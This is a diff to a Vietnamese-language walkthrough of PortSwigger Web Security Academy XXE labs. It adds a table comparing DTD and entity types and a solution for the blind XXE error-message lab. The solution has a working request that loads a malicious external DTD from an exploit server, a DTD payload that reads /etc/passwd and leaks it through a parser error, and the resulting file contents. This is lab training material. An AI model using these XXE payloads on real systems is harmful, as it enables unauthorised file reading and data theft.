@@ -53,6 +53,15 @@ image:
 | **Blind XXE - Rò rỉ dữ liệu qua lỗi**          | Gây ra lỗi trong quá trình phân tích XML, khiến dữ liệu nhạy cảm bị rò rỉ qua thông báo lỗi trả về từ ứng dụng.                        |
 
 ## Solve **XML External Entity Injection (XXE)** Lab
+
+| Thuộc tính                | **Internal DTD**                              | **External DTD**                                              | **Internal Entity**                                         | **External Entity**                                           |
+| ------------------------- | --------------------------------------------- | ------------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------- |
+| **Vị trí định nghĩa**     | Ngay trong tài liệu XML                       | Trong file .dtd bên ngoài (hoặc đường dẫn HTTP, file://, ...) | Trong DTD nội bộ hoặc XML                                   | Trỏ tới tài nguyên bên ngoài qua URL/file                     |
+| **Cách khai báo**         | `<!DOCTYPE ... [ ... ]>`                      | `<!DOCTYPE root SYSTEM "file.dtd">`                           | `<!ENTITY name "giá trị">`                                  | `<!ENTITY name SYSTEM "http://...">`                          |
+| **Tải từ đâu**            | XML parser đọc trực tiếp từ nội dung file XML | XML parser phải tải file `.dtd` từ URL hoặc file hệ thống     | Giá trị được gán trực tiếp (văn bản thuần)                  | Tải nội dung từ tài nguyên ngoài (file, URL, etc.)            |
+| **Có thể gây XXE không?** | ❌ Không trực tiếp gây OOB XXE                 | ✅ Có thể dùng để tải entity độc hại từ attacker               | ❌ Không có khả năng tương tác với hệ thống hoặc gửi dữ liệu | ✅ Có thể dùng để đọc file, thực hiện HTTP request, exfiltrate |
+| **Dễ bị lọc không?**      | ✅ Dễ bị phát hiện và lọc                      | ❌ Khó lọc hơn nếu dùng qua `file:///`, `jar:` v.v.            | ✅ Hầu như vô hại                                            | ✅ Có khả năng nguy hiểm nếu parser không kiểm soát            |
+
 ---
 ### Lab: Exploiting XXE using external entities to retrieve files
 #### Exploit
@@ -295,7 +304,48 @@ Host: 0a1f00d704dddf3e80eb3a20004a0097.web-security-academy.net
 ```
 - Đến **Burp Collaborator** > **Pool now**, lấy **hostname** từ request đến và submit
 
-### 
+- Theo chuẩn XML:
+    - Nếu bạn chỉ dùng internal DTD, bạn không được phép định nghĩa một entity tham số **(parameter entity)** bên trong định nghĩa của **entity** khác (parser sẽ báo lỗi).
+    - Nhưng nếu bạn sử dụng hybrid DTD — tức là:
+        - Tài liệu XML có DTD nội bộ, và
+        - Tài liệu đó cũng load thêm một DTD bên ngoài (SYSTEM "file://...")
+    - Thì parser sẽ "thư giãn" quy tắc, và cho phép bạn ghi đè các **entity** đã định nghĩa trong **external DTD** từ phần **internal DTD**.
+
+### Lab: Exploiting blind XXE to retrieve data via error messages
+- Tương tự như lab trên nhưng thay đổi payload thành:
+
+```http
+POST /product/stock HTTP/2
+Host: 0ac900f00310f92a80080d33001b00b3.web-security-academy.net
+...
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
+<!ENTITY % ref SYSTEM "https://exploit-0add00b803d7f998808c0cf8018a00b8.exploit-server.net/exploit">
+%ref;
+]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+- Trong body của **Exploit Server**
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+- Ứng dụng sẽ trả về lỗi:
+
+```text
+"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+```
 
 ## Prevent
 --- 
